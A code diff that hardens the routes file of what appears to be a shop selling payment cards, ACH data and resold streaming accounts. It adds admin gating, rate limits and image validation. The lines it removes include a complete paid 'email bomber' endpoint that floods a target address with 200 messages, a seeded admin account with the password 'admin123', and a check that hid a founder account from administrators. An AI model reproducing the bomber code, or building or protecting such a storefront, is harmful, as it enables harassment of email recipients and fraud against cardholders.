@@ -2,7 +2,7 @@ import express, { type Express } from "express";
 import { createServer, type Server } from "http";
 import rateLimit from "express-rate-limit";
 import { storage } from "./storage";
-import { setupAuth, isFounderIdentity } from "./auth";
+import { setupAuth, MIN_PASSWORD_LENGTH, passwordChangeLimiter } from "./auth";
 import { api } from "@shared/routes";
 import { z } from "zod";
 import { scrypt, randomBytes, timingSafeEqual } from "crypto";
@@ -11,15 +11,22 @@ import { hashPassword, comparePassword } from "./auth";
 import { cryptoPayments, orders, orderItems, verifications, variants, userIps, users, mails, mailReads, discountCodes, transactions, stockItems, cards, achs, products } from "@shared/schema";
 import { db } from "./db";
 import { eq, and, ne, desc, sql } from "drizzle-orm";
-import nodemailer from "nodemailer";
-
 function isAdminOrWorker(req: any): boolean {
   const u = req.user as any;
-  return req.isAuthenticated() && (u?.role === 'admin' || u?.isWorker === true);
+  return req.isAuthenticated() && (u?.role === "admin" || u?.isWorker === true);
 }
 
-// In-memory store for email bomb jobs
-const emailBombJobs = new Map<string, { sent: number; total: number; status: "running" | "done" | "failed" }>();
+function requireAdmin(req: any, res: any, next: any) {
+  if (!req.isAuthenticated?.() || req.user?.role !== "admin") {
+    return res.status(403).json({ message: "Forbidden" });
+  }
+  if (["POST", "PUT", "PATCH", "DELETE"].includes(req.method)) {
+    res.on("finish", () => {
+      console.info(`[security] admin action user=${req.user.id} method=${req.method} path=${req.path} status=${res.statusCode}`);
+    });
+  }
+  next();
+}
 
 // BIN lookup cache + throttle queue (binlist.net = ~10 req/min free tier)
 const binCache = new Map<string, any>();
@@ -80,6 +87,32 @@ const apiLimiter = rateLimit({
   skip: (req) => !req.path.startsWith("/api"),
 });
 
+const adminLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 180,
+  message: { message: "Too many administrative requests. Try again later." },
+  standardHeaders: true,
+  legacyHeaders: false,
+});
+
+const MAX_IMAGE_BYTES = 4 * 1024 * 1024;
+const imageSignatures: Array<{ mimeType: string; extension: string; matches: (data: Buffer) => boolean }> = [
+  { mimeType: "image/png", extension: "png", matches: (data) => data.subarray(0, 8).equals(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])) },
+  { mimeType: "image/jpeg", extension: "jpg", matches: (data) => data.length >= 3 && data[0] === 0xff && data[1] === 0xd8 && data[2] === 0xff },
+  { mimeType: "image/webp", extension: "webp", matches: (data) => data.length >= 12 && data.subarray(0, 4).toString() === "RIFF" && data.subarray(8, 12).toString() === "WEBP" },
+];
+
+function validateImageUpload(data: unknown) {
+  if (typeof data !== "string" || data.length === 0) return null;
+  const base64 = data.replace(/^data:[^;]+;base64,/, "");
+  if (!/^[A-Za-z0-9+/]+={0,2}$/.test(base64)) return null;
+  const buffer = Buffer.from(base64, "base64");
+  if (buffer.length === 0 || buffer.length > MAX_IMAGE_BYTES) return null;
+  const matched = imageSignatures.find((image) => image.matches(buffer));
+  if (!matched) return null;
+  return { data: buffer.toString("base64"), ...matched };
+}
+
 export async function registerRoutes(
   httpServer: Server,
   app: Express
@@ -95,6 +128,9 @@ export async function registerRoutes(
 
   // Auth setup (handles /api/login, /api/register, /api/logout, /api/user)
   setupAuth(app);
+  // Every /api/admin route must pass this server-side gate. Individual routes
+  // may apply narrower checks, but a missing per-route check cannot grant access.
+  app.use("/api/admin", adminLimiter, requireAdmin);
 
   // Public announcements
   app.get("/api/announcements", async (req, res) => {
@@ -528,17 +564,21 @@ export async function registerRoutes(
   });
 
   // User - Update Password
-  app.patch("/api/user/password", async (req, res) => {
+  app.patch("/api/user/password", passwordChangeLimiter, async (req, res) => {
     if (!req.isAuthenticated()) return res.status(401).json({ message: "Not authenticated" });
     try {
       const { currentPassword, newPassword } = req.body;
       if (!currentPassword || !newPassword) return res.status(400).json({ message: "Both passwords required" });
+      if (typeof newPassword !== "string" || newPassword.length < MIN_PASSWORD_LENGTH) {
+        return res.status(400).json({ message: `Password must be at least ${MIN_PASSWORD_LENGTH} characters` });
+      }
       const [currentUser] = await db.select().from(users).where(eq(users.id, (req.user as any).id));
       if (!currentUser) return res.status(404).json({ message: "User not found" });
       const isMatch = await comparePassword(currentPassword, currentUser.password);
       if (!isMatch) return res.status(400).json({ message: "Current password is incorrect" });
       const hashed = await hashPassword(newPassword);
-      const user = await storage.updateUser((req.user as any).id, { password: hashed });
+      await storage.updateUser((req.user as any).id, { password: hashed });
+      console.info(`[security] password changed for user ${(req.user as any).id}`);
       res.json({ success: true });
     } catch (e: any) {
       res.status(400).json({ message: e.message });
@@ -772,6 +812,9 @@ export async function registerRoutes(
 
   // Admin - Test Order (No Payment)
   app.post("/api/admin/test-order", async (req, res) => {
+    if (process.env.NODE_ENV === "production") {
+      return res.status(404).json({ message: "Not found" });
+    }
     if (!req.isAuthenticated() || (req.user as any).role !== 'admin') {
       return res.status(401).json({ message: "Unauthorized" });
     }
@@ -922,7 +965,7 @@ export async function registerRoutes(
   app.get("/api/admin/users", async (req, res) => {
     if (!isAdminOrWorker(req)) return res.status(401).json({ message: "Unauthorized" });
     const allUsers = await storage.getAllUsers();
-    res.json(allUsers.filter((u: any) => !isFounderIdentity(u.email || "")));
+    res.json(allUsers);
   });
 
   // Old Admin Orders (keeping for backward compat)
@@ -960,7 +1003,7 @@ export async function registerRoutes(
     }
     const targetId = Number(req.params.id);
     const target = await storage.getUser(targetId);
-    if (target && isFounderIdentity(target.email || "")) return res.status(403).json({ message: "Cannot modify this account" });
+    if (target && target.id === (req.user as any).id) return res.status(403).json({ message: "Cannot modify your own account" });
     const { isBanned, role, email } = req.body;
     const user = await storage.updateUser(targetId, { isBanned, role, email });
     res.json(user);
@@ -1160,11 +1203,12 @@ export async function registerRoutes(
     if (!req.isAuthenticated() || (req.user as any).role !== 'admin') {
       return res.status(401).json({ message: "Unauthorized" });
     }
-    const { filename, mimeType, data } = req.body;
-    if (!filename || !mimeType || !data) {
-      return res.status(400).json({ message: "Missing required fields" });
+    const validated = validateImageUpload(req.body?.data);
+    if (!validated) {
+      return res.status(400).json({ message: "Upload a PNG, JPEG, or WebP image smaller than 4 MB" });
     }
-    const image = await storage.uploadImage(filename, mimeType, data);
+    const filename = `image-${randomBytes(12).toString("hex")}.${validated.extension}`;
+    const image = await storage.uploadImage(filename, validated.mimeType, validated.data);
     res.status(201).json({ id: image.id, url: `/api/images/${image.id}` });
   });
 
@@ -1173,9 +1217,14 @@ export async function registerRoutes(
     const image = await storage.getImage(Number(req.params.id));
     if (!image) return res.status(404).json({ message: "Image not found" });
     
-    const buffer = Buffer.from(image.data, 'base64');
-    res.setHeader('Content-Type', image.mimeType);
+    const buffer = Buffer.from(image.data, "base64");
+    const safeImage = imageSignatures.find((candidate) => candidate.mimeType === image.mimeType && candidate.matches(buffer));
+    if (!safeImage) return res.status(404).json({ message: "Image not found" });
+    res.setHeader("Content-Type", safeImage.mimeType);
     res.setHeader('Content-Length', buffer.length);
+    res.setHeader("X-Content-Type-Options", "nosniff");
+    res.setHeader("Content-Disposition", "inline");
+    res.setHeader("Cache-Control", "public, max-age=86400, immutable");
     res.send(buffer);
   });
 
@@ -2021,120 +2070,6 @@ export async function registerRoutes(
   });
 
 
-
-  // Seed Data (if empty)
-  const seedStats = await storage.getDashboardStats();
-  if (seedStats.totalUsers === 0) {
-    console.log("Seeding database...");
-    const { hashPassword } = await import("./auth");
-    const adminPass = await hashPassword("admin123");
-    await storage.createUser({
-      username: "admin",
-      password: adminPass,
-      email: "admin@store.com",
-      role: "admin",
-      confirmPassword: "admin123"
-    } as any);
-
-    const demoPass = await hashPassword("user123");
-    await storage.createUser({
-      username: "demo",
-      password: demoPass,
-      email: "demo@user.com",
-      role: "user",
-      confirmPassword: "user123"
-    } as any);
-
-    // Seed Product
-    const prod = await storage.createProduct({
-      name: "Netflix Premium (1 Month)",
-      description: "4K UHD, 4 Screens. Private account.",
-      image: "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg",
-      active: true
-    });
-
-    const variant = await storage.createVariant({
-      productId: prod.id,
-      name: "Private Account",
-      price: 500 // $5.00
-    });
-
-    await storage.addStockItems(variant.id, 
-      "user1@email.com\npass1\nextra_info1\n\nuser2@email.com\npass2\nextra_info2"
-    );
-  }
-
-  // ── Email Bomber ──────────────────────────────────────────────
-  app.post("/api/tools/email-bomb", async (req, res) => {
-    if (!req.isAuthenticated()) return res.status(401).json({ message: "Unauthorized" });
-    const { email } = req.body;
-    if (!email || typeof email !== "string" || !/\S+@\S+\.\S+/.test(email)) {
-      return res.status(400).json({ message: "Valid target email required" });
-    }
-
-    const user = req.user as any;
-    const COST = 50; // $0.50 in cents
-    if ((user.balance || 0) < COST) {
-      return res.status(400).json({ message: "Insufficient balance — need $0.50" });
-    }
-
-    const smtpEmail = await storage.getSetting("smtp_email", "");
-    const smtpPassword = await storage.getSetting("smtp_password", "");
-    const smtpHost = await storage.getSetting("smtp_host", "smtp.gmail.com");
-    const smtpPort = parseInt(await storage.getSetting("smtp_port", "587"));
-
-    if (!smtpEmail || !smtpPassword) {
-      return res.status(500).json({ message: "SMTP not configured — contact admin" });
-    }
-
-    // Deduct balance
-    await storage.updateUserBalance(user.id, -COST);
-    await storage.createTransaction(user.id, -COST, "email_bomb", `Email bomb → ${email}`);
-
-    const jobId = randomBytes(8).toString("hex");
-    const job = { sent: 0, total: 200, status: "running" as const };
-    emailBombJobs.set(jobId, job);
-
-    res.json({ jobId, total: 200 });
-
-    // Run bomb in background
-    (async () => {
-      try {
-        const transporter = nodemailer.createTransport({
-          host: smtpHost,
-          port: smtpPort,
-          secure: smtpPort === 465,
-          auth: { user: smtpEmail, pass: smtpPassword },
-          tls: { rejectUnauthorized: false },
-        });
-
-        const j = emailBombJobs.get(jobId)!;
-        for (let i = 0; i < 200; i++) {
-          try {
-            await transporter.sendMail({
-              from: smtpEmail,
-              to: email,
-              subject: `Notification #${i + 1}`,
-              text: `You have a new message. (${i + 1} of 200)`,
-            });
-          } catch (_) {}
-          j.sent = i + 1;
-          if (i < 199) await new Promise((r) => setTimeout(r, 500));
-        }
-        j.status = "done";
-      } catch {
-        const j = emailBombJobs.get(jobId);
-        if (j) j.status = "failed";
-      }
-    })();
-  });
-
-  app.get("/api/tools/email-bomb/:jobId", (req, res) => {
-    if (!req.isAuthenticated()) return res.status(401).json({ message: "Unauthorized" });
-    const job = emailBombJobs.get(req.params.jobId);
-    if (!job) return res.status(404).json({ message: "Job not found" });
-    res.json(job);
-  });
 
   // ── ACH ──────────────────────────────────────────────────────
   app.get("/api/ach", async (req, res) => {
